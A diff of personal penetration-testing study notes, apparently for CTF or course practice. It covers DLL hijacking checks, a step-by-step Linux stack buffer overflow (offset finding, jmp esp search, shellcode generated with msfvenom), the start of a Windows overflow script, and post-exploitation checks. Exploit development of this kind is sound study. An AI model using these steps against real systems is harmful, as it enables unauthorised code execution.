@@ -78,7 +78,7 @@ Web Stuff:
     
     
 ###################
-Bin Replacement/DLL Hijacking
+Windows Bin Replacement/DLL Hijacking
 ###################   
   service in the GUI
   look for blank or obvious descriptions
@@ -88,13 +88,12 @@ Bin Replacement/DLL Hijacking
   
   auditpol /get /category:* | findstr /i "success failure"    #need privs
   
-  
 ###################
-Buffer Overflow:
-###################
+Linux Buffer Overflow:
+###################   
     Methodology:
     <program> = func
-    >gdb program
+    >gdb func
     >disass main         - disassemble main function
        find more functions and disassemble those
     >run                 - runs the program
@@ -106,24 +105,25 @@ Buffer Overflow:
 
     in a script:
     https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+    JUST RUN THE PROGRAM IN PEDA AND PASTE THE STRING IN TO FIND THE OFFSET OR
     ####################################################################################################333
     buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
 
     eip = "BBBB"
 
-    nop = '\x90' *  5
+    nop = '\x90' *  15(5)
 
     print(buffer + eip + nop)
     ######################################################################################################
 
     >gdb program
     >run <<< $(python3 lin_buff.py)
+    OR JUST RUN THE PROGRAM IN PEDA AND PASTE THE STRING IN TO FIND THE OFFSET
 
     grab the EIP Register value: EIP: 0x31634130 ('0Ac1')     #0x31634130
     put it into wiremask; gives you the offset/length of the buffer you need to overflow
     change the buffer in the script to "A" * <offset size>
     ###########################################################################################################
-    #buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
     buffer = "A" * 62
     ###########################################################################################################
     run
@@ -133,32 +133,34 @@ Buffer Overflow:
     >show env
     >unset env LINES
     >unset env COLUMNS
-    >run     #not from gdb peda
+    >run
     over flow again
     >info proc map
-    get the mem address from the first after heap to the last one in the stack
+    get the mem address from the first after heap to the last one before the stack
     >find /b 0xf7de1000(first) , 0xffffe000(last), 0xff, 0xe4
     copy 6 of the addresses
 
     modify script
     ############################################################
     #eip = "BBBB"
-    eip = "\xfb\x45\xf6\xf7"      #one of the address but reverse the pairs
-    #0xf7de3b59
-    #0xf7f588ab
-    #0xf7f645fb
-    #0xf7f6460f
-    #0xf7f64aeb
-    #0xf7f64aff
+    eip = "\xfb\x45\xf6\xf7"      #one of the address but reverse bytes order
+    '''
+    0xf7de3b59    #split them up: 0x f7 de 3b 59
+    0xf7f588ab
+    0xf7f645fb
+    0xf7f6460f
+    0xf7f64aeb
+    0xf7f64aff
+    '''
     ############################################################
 
+    >msfvenom -p linux/x86/exec CMD="whoami" -b "\x00" -f python
+    -OR-
     >msfconsole
     >use payload/linux/x86/exec
     >show options
     >set CMD whoami
     >generate -b "\x00" -f python
-    
-    
 
     modify script:
     #############################################################
@@ -194,7 +196,9 @@ Buffer Overflow:
      change the jump esp
 
     
-    
+###################
+Windows Buffer Overflow:
+###################   
     ##############################win_buf.py#######################################
     import socket
 
@@ -261,9 +265,12 @@ POST EXPLOITATION
   ls /tmp
 
 WINDOWS
-  services, look for blank or obvious descriptions
-  GUI > File Explorer > view > file extensions/hidden items
-  
+  RUN KEYS
+  RUN KEYS
+  RUN KEYS
+  RUN KEYS
+  RUN KEYS
+  auditpol /get /category:* | findstr /i "success failure"    #need privs
   
   
   
